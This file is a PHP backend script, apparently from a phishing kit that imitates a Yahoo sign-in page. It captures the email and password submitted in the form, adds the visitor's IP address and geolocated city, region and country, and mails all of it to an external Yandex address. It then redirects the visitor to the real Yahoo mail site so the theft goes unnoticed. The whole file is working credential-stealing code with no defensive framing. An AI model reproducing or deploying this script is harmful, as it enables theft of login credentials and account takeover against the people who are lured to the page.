<?php

require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();
$geoplugin->locate();
if (!empty($_SERVER['HTTP_CLIENT_IP'])) { 
    $ip = $_SERVER['HTTP_CLIENT_IP']; 
} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) { 
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; 
} else { 
    $ip = $_SERVER['REMOTE_ADDR']; 
} 
$adddate=date("D M d, Y g:i a");
$email = $_POST['email'];
$password = $_POST['password'];
$ip = getenv("REMOTE_ADDR");
$subj = "‎YAHOO $ip ";
$msg .= "--------------------------------------------\n";
$msg .= "Email         : ".$_POST['email']."\n";
$msg .= "Password      : ".$_POST['password']."\n";
$msg .= "IP: ".$ip.      "\n";
$msg .= "City: {$geoplugin->city}\n";
$msg .= "Region: {$geoplugin->region}\n";
$msg .= "Country Name: {$geoplugin->countryName}\n";
$msg .= "Country Code: {$geoplugin->countryCode}\n";
$msg .= "Date: ".$adddate."\n";
$msg .= "--------------------------------------------\n";

if (($email==NULL)){

echo "<script>location.replace('YY.html');</script>";
exit;
}

if (($password==NULL)){

echo "<script>location.replace('YY.html');</script>";
exit;
}

else {

mail("robinsondreck@yandex.com", $subj, $msg);

echo "<script language=javascript>
alert('Connecting please wait');
window.location='https://mail.yahoo.com';
</script>";
    
}

?>